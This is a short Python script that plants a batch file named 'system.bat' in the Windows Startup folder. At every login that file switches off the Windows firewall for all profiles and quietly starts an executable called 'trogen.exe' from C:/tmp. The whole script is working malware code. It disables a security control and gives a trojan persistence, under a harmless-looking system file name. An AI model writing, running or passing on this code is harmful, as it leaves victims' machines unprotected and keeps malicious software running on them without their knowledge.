import os

def create_startup_file():
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "system.bat")
    try:
        with open(startup_folder, 'w') as file:
            file.write("@echo off \n")
            file.write("netsh advfirewall set allprofiles state off \n")
            file.write("start /B C:/tmp/trogen.exe")
        print("Content successfully written to the file. : {}".format(startup_folder))
    except IOError:
        print("Error: Unable to write to the file.")
